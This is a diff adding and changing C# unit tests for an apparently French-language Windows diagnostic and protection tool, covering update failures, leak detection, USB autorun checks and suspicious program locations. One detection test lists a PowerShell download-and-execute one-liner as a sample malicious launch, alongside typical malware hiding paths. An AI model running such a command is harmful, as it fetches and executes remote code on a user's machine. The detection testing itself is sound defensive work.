@@ -165,8 +165,25 @@ public sealed class PreventionTests : IDisposable
         var summary = UpdateHistory.Summarize(history, now);
 
         Assert.Equal(now.AddDays(-70), summary.LastSuccess);
-        Assert.Equal(2, summary.Failures);
+        Assert.Equal(1, summary.Failures);
         Assert.Single(summary.FailedTitles);
+    }
+
+    [Fact]
+    public void AnUpdateThatSucceededOnRetryIsNotStuck()
+    {
+        var now = new DateTime(2026, 11, 11, 0, 0, 0, DateTimeKind.Utc);
+        var history = new[]
+        {
+            new UpdateHistory.Entry("2026-11 Mise à jour cumulative (KB5100001)", now.AddDays(-5), 4, 1, unchecked((int)0x80240034)),
+            new UpdateHistory.Entry("2026-11 Mise à jour cumulative (KB5100001)", now.AddDays(-4), 4, 1, unchecked((int)0x80240034)),
+            new UpdateHistory.Entry("2026-11 Mise à jour cumulative (KB5100001)", now.AddDays(-3), 2, 1, 0),
+            new UpdateHistory.Entry("Intel Ports Driver Update (2543.9.0.0)", now.AddDays(-2), 4, 1, unchecked((int)0x80240034)),
+            new UpdateHistory.Entry("Intel Ports Driver Update (2543.9.0.0)", now.AddDays(-1), 4, 1, unchecked((int)0x80240034)),
+            new UpdateHistory.Entry("2026-11 Correctif de sécurité (KB5100002)", now.AddDays(-1), 4, 1, unchecked((int)0x80240034)),
+        };
+
+        Assert.Equal(0, UpdateHistory.Summarize(history, now).Failures);
     }
 
     [Fact]
@@ -271,7 +288,7 @@ public sealed class PreventionTests : IDisposable
         var copy = JsonDocument.Parse(preferences.RootElement.GetRawText());
 
         Assert.Equal(["https://news.example:443"], Browsers.NotificationSites(preferences));
-        Assert.Equal(["Outil local", "Barre de recherche"], Browsers.SuspiciousExtensions(copy));
+        Assert.Equal(["Barre de recherche"], Browsers.SuspiciousExtensions(copy));
         Assert.Empty(Browsers.NotificationSites(null));
     }
 
@@ -299,13 +316,15 @@ public sealed class PreventionTests : IDisposable
     {
         var start = DateTimeOffset.UtcNow;
         const long gb = 1L << 30;
-        var leaking = Enumerable.Range(0, 13).Select(i => (start.AddMinutes(5.0 * i), gb + (i * gb / 6))).ToList();
-        var stable = Enumerable.Range(0, 13).Select(i => (start.AddMinutes(5.0 * i), 2 * gb)).ToList();
+        var leaking = Enumerable.Range(0, 25).Select(i => (start.AddMinutes(5.0 * i), gb + (i * gb / 6))).ToList();
+        var stable = Enumerable.Range(0, 25).Select(i => (start.AddMinutes(5.0 * i), 2 * gb)).ToList();
         var sawtooth = leaking.Select((s, i) => i == 6 ? (s.Item1, gb / 2) : s).ToList();
+        var oneHourOnly = leaking.Take(13).ToList();
 
         Assert.Equal(2, ProcessActivityCollector.LeakRate(leaking));
         Assert.Null(ProcessActivityCollector.LeakRate(stable));
         Assert.Null(ProcessActivityCollector.LeakRate(sawtooth));
+        Assert.Null(ProcessActivityCollector.LeakRate(oneHourOnly));
     }
 
     [Fact]
@@ -339,6 +358,17 @@ public sealed class PreventionTests : IDisposable
     }
 
     [Fact]
+    public void AUserShortcutToAScriptOrAnOldInstallerIsNotAThreat()
+    {
+        File.WriteAllBytes(Path.Combine(_folder, "Sauvegarde.lnk"), Encoding.Unicode.GetBytes(@"C:\Windows\System32\cmd.exe /c E:\sauvegarde.bat"));
+        File.WriteAllText(Path.Combine(_folder, "sauvegarde.bat"), "robocopy");
+        File.WriteAllText(Path.Combine(_folder, "autorun.inf"), "[autorun]\r\nopen=setup.exe\r\nicon=setup.ico");
+        File.WriteAllText(Path.Combine(_folder, "setup.exe"), "MZ");
+
+        Assert.Empty(UsbThreats.Scan(_folder));
+    }
+
+    [Fact]
     public void RecognisesRansomwareBehaviour()
     {
         var t = DateTimeOffset.UtcNow;
@@ -368,6 +398,73 @@ public sealed class PreventionTests : IDisposable
         Assert.False(ProgramPaths.IsUserWritable(@"C:\Program Files\App\app.exe"));
         Assert.False(ProgramPaths.IsUserWritable(@"C:\Users\A\AppData\Local\Microsoft\WindowsApps\MSTeams_8wekyb3d8bbwe\ms-teams.exe"));
     }
+
+    [Theory]
+    [InlineData(@"C:\Users\A\AppData\Roaming\svchost.exe", true)]
+    [InlineData(@"C:\Users\A\AppData\Local\Temp\a\run.exe", true)]
+    [InlineData(@"C:\Users\A\Downloads\crack.exe", true)]
+    [InlineData(@"C:\ProgramData\update.exe", true)]
+    [InlineData(@"C:\Users\A\AppData\Roaming\Microsoft\Windows\helper.exe", true)]
+    [InlineData(@"C:\Users\A\AppData\Local\Programs\Petit outil\outil.exe", false)]
+    [InlineData(@"C:\Users\A\AppData\Roaming\Zoom\bin\Zoom.exe", false)]
+    [InlineData(@"C:\Users\A\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\app.lnk", false)]
+    [InlineData(@"E:\Projet\bin\Debug\outil.exe", false)]
+    public void OnlyMalwareHidingPlacesAreSuspicious(string path, bool suspicious) =>
+        Assert.Equal(suspicious, ProgramPaths.IsSuspiciousLocation(path));
+
+    [Theory]
+    [InlineData("powershell.exe", @"-WindowStyle Hidden -File ""C:\Program Files\Fabricant\maintenance.ps1""", false)]
+    [InlineData("wscript.exe", @"""C:\Users\A\AppData\Roaming\x.vbs""", true)]
+    [InlineData("cmd.exe", @"/c start C:\Users\A\AppData\Local\Temp\a.bat", true)]
+    [InlineData("powershell.exe", "-nop -c iex (New-Object Net.WebClient).DownloadString('http://x')", true)]
+    public void JudgesScriptHostsByWhatTheyLaunch(string executable, string arguments, bool suspicious) =>
+        Assert.Equal(suspicious, ProgramPaths.IsSuspiciousLaunch(executable, arguments, _ => SignatureState.Valide));
+
+    [Fact]
+    public void UnsignedProgramsOnlyCountInHidingPlaces()
+    {
+        Assert.True(ProgramPaths.IsSuspiciousLaunch(@"C:\Users\A\AppData\Roaming\svc.exe", "", _ => SignatureState.NonSigne));
+        Assert.False(ProgramPaths.IsSuspiciousLaunch(@"C:\Users\A\AppData\Local\Programs\Outil\outil.exe", "", _ => SignatureState.NonSigne));
+        Assert.False(ProgramPaths.IsSuspiciousLaunch(@"C:\Users\A\AppData\Roaming\svc.exe", "", _ => SignatureState.Valide));
+    }
+
+    [Fact]
+    public void ReadsTheTargetOfAShortcut()
+    {
+        var shortcut = Path.Combine(_folder, "app.lnk");
+        File.WriteAllBytes(shortcut, [.. new byte[40], .. Encoding.Unicode.GetBytes(@"C:\Program Files\App\app.exe"), 0, 0, .. new byte[20]]);
+
+        Assert.Equal(@"C:\Program Files\App\app.exe", ProgramPaths.ShortcutTarget(shortcut));
+    }
+
+    [Fact]
+    public void BlockingTelemetryInHostsIsNotSuspicious() =>
+        Assert.Empty(HostsFile.Suspicious(["0.0.0.0 vortex.data.microsoft.com", "0.0.0.0 www.google-analytics.com", "127.0.0.1 ads.facebook.com", "0.0.0.0 box.com"]));
+
+    [Fact]
+    public void OnlyRealPowerCutsCount()
+    {
+        XDocument Event(string bugcheck, string button) => XDocument.Parse($"""<Event><EventData><Data Name="BugcheckCode">{bugcheck}</Data><Data Name="PowerButtonTimestamp">{button}</Data></EventData></Event>""");
+
+        Assert.True(EventLogCollector.IsPowerCut(Event("0", "0")));
+        Assert.False(EventLogCollector.IsPowerCut(Event("0", "134369036154104707")));
+        Assert.False(EventLogCollector.IsPowerCut(Event("26", "0")));
+    }
+
+    [Fact]
+    public void WifiDropsAroundSleepAreIgnored()
+    {
+        var t = new DateTime(2026, 11, 11, 9, 0, 0, DateTimeKind.Utc);
+
+        Assert.Equal(1, EventLogCollector.UnexplainedDrops([t, t.AddHours(2), t.AddHours(5)], [t.AddMinutes(1), t.AddHours(5).AddSeconds(-30)], TimeSpan.FromMinutes(3)));
+    }
+
+    [Theory]
+    [InlineData(0b0000_0010, false)]
+    [InlineData(0b0000_0001, true)]
+    [InlineData(0b0000_1000, true)]
+    [InlineData(0, false)]
+    public void TheNvmeTemperatureBitAloneIsNotCritical(byte warning, bool critical) => Assert.Equal(critical, NvmeHealth.IsCritical(warning));
 
     // --- Actions -------------------------------------------------------------------------------
 
